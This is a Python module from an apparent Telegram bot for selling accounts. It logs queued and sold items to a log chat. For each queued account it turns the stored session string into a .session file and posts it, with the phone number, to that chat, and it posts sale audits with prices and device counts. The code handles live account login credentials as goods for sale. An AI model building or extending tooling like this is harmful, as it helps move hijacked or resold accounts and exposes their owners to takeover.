import logging

from app import session_export
from app.config import LOG_CHAT_ID, LOG_QUEUE_TOPIC, LOG_SOLD_TOPIC
from app.utils import tg
from app.utils.texts import sold_audit_text

log = logging.getLogger("logs")


def enabled() -> bool:
    return bool(LOG_CHAT_ID)


async def queued(bot, p: dict, data: dict, sup: str):
    if not enabled():
        return
    await tg.send(bot, LOG_CHAT_ID, queue_text(p, data, sup), topic=LOG_QUEUE_TOPIC)
    name = (p.get("phone") or str(p.get("item_id"))).lstrip("+") or "session"
    try:
        blob = session_export.sqlite_bytes(p.get("session_string") or "")
    except Exception as e:
        log.info(f"session export {name}: {e}")
        return
    await tg.send_document(bot, LOG_CHAT_ID, blob, f"{name}.session",
                           topic=LOG_QUEUE_TOPIC)


async def sold(bot, p: dict, offer: dict, sup: str, devices: int, confirm: int,
               sale_id: str, sold_price: float, totals: dict):
    if not enabled():
        return
    await tg.send(bot, LOG_CHAT_ID,
                  sold_audit_text(p, offer, sup, devices, confirm, sale_id,
                                  sold_price, totals),
                  topic=LOG_SOLD_TOPIC)


def queue_text(p: dict, data: dict, sup: str) -> str:
    from app.utils.texts import audit_text
    return audit_text(p, data, sup)